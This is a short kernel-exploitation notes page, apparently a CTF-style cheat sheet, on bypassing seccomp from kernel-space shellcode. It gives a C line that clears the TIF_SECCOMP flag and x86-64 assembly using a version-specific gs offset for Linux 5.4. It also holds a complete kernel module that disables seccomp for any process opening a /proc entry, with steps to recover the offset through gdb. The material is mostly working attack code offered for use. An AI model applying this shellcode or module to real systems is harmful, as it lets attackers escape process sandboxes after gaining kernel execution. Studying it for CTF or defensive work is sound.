---
title: "kpwn"
permalink: /kernel-pwn-notes
layout: single
author_profile: trues
---


# Bypass seccomp via shellcode in kernel space
While coding in C you can do:
```c
current->thread_info.flags &= ~_TIF_SECCOMP;
```
but when shellcodeing you need to do something like:
```s
mov rax, QWORD PTR gs:0x15d00
and QWORD PTR [rax], 0xfffffffffffffeff
```
(note 0x15d00 is the offset for linux 5.4, it changes in other versions)
Generally you can compile a small C kernel module like
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <asm/thread_info.h>

MODULE_LICENSE("GPL");

void disable_seccomp(void) {
#ifdef TIF_SECCOMP
    current->thread_info.flags &= ~(1UL << TIF_SECCOMP);
#else
    current->thread_info.flags &= ~(1UL << 8);
#endif
    pr_info("PWNED: Seccomp disabilitato per %s [%d]\n", current->comm, current->pid);
}

static int my_proc_open(struct inode *inode, struct file *file) {
    disable_seccomp();
    return 0;
}

static const struct file_operations my_fops = {
    .owner = THIS_MODULE,
    .open  = my_proc_open,
};

static int __init seccomp_bypass_init(void) {
    proc_create("pwn_seccomp", 0444, NULL, &my_fops);
    pr_info("Modulo caricato su Kernel 5.4. Apri /proc/pwn_seccomp.\n");
    return 0;
}

static void __exit seccomp_bypass_exit(void) {
    remove_proc_entry("pwn_seccomp", NULL);
}

module_init(seccomp_bypass_init);
module_exit(seccomp_bypass_exit);
```
load it via `insmod`, then using gdb check the disassembly of `disable_seccomp` to find the assembly instructions you need and the correct offset.